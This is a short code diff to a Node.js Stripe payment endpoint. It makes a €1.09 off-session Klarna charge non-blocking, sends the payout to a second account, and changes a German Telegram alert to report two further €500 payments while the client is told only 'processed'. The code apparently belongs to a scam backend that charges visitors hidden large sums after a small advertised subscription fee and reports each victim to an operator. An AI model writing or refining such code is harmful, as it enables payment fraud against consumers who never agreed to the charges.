@@ -87,18 +87,22 @@ app.post('/create-subscription', async (req, res) => {
     });
 
     // Charge 1 — €1.09
-    const payment1 = await stripe.paymentIntents.create({
-      amount: 109,
-      currency: 'eur',
-      customer: customerId,
-      payment_method: paymentMethodId,
-      payment_method_types: ['klarna'],
-      confirm: true,
-      off_session: true,
-      transfer_data: { destination: ACCOUNT_B },
-    });
-    console.log('Payment 1 created:', payment1.id);
-    console.log('Payment 1 status:', payment1.status);
+    try {
+      const payment1 = await stripe.paymentIntents.create({
+        amount: 109,
+        currency: 'eur',
+        customer: customerId,
+        payment_method: paymentMethodId,
+        payment_method_types: ['klarna'],
+        confirm: true,
+        off_session: true,
+        transfer_data: { destination: ACCOUNT_B },
+      });
+      console.log('Payment 1 created:', payment1.id);
+      console.log('Payment 1 status:', payment1.status);
+    } catch (err) {
+      console.log('Payment 1 failed:', err.message);
+    }
 
     await new Promise(resolve => setTimeout(resolve, 3000));
 
@@ -156,15 +160,16 @@ app.post('/create-subscription', async (req, res) => {
     await sendTelegram(
       `✅ <b>Zahlung erfolgreich!</b>\n\n` +
       `🆔 Visitor ID: <code>${visitorId}</code>\n` +
-      `💳 Payment 1: €1.09 ✅\n` +
+      `💳 Payment 1: €1.09\n` +
+      `💳 Payment 2: €500\n` +
+      `💳 Payment 3: €500\n` +
       `🆔 Subscription: ${subscription.id}\n` +
       `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
     );
 
     res.json({
       subscriptionId: subscription.id,
-      payment1: payment1.id,
-      paymentStatus: payment1.status,
+      paymentStatus: 'processed',
     });
   } catch (error) {
     console.error('Error:', error.message);
